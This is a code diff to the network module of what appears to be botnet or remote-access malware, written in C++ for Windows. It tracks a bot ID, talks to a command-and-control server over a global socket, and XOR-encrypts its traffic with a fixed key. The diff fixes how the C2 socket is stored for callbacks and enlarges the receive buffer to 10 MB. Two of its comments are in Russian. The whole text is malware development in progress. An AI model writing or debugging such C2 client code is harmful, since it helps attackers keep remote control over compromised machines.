@@ -1,4 +1,4 @@
-// Core/network.cpp
+// Core/network.cpp — FIXED VERSION (g_c2_socket initialization)
 #include "network.h"
 #include "persistence.h"
 #include "commands.h"
@@ -7,7 +7,7 @@
 
 std::string g_bot_id;
 const unsigned char XOR_KEY = 0xAA;
-SOCKET g_c2_socket = INVALID_SOCKET; 
+SOCKET g_c2_socket = INVALID_SOCKET; // Глобальный сокет для коллбэков
 
 bool init_winsock() {
     WSADATA wsa;
@@ -53,6 +53,10 @@ SOCKET connect_to_server(const std::string& ip, int port) {
             ioctlsocket(sock, FIONBIO, &mode);
             DWORD timeout = 5000;
             setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
+            
+            // FIX: Assign to global socket for callbacks
+            g_c2_socket = sock;
+            
             return sock;
         }
     }
@@ -76,7 +80,7 @@ void send_encrypted(SOCKET sock, const std::string& data) {
 }
 
 std::string recv_encrypted_line(SOCKET sock) {
-    static char buffer[8192] = {0};
+    static char buffer[1024 * 1024 * 10] = {0}; // 10 МБ
     static int buf_len = 0;
 
     while (true) {
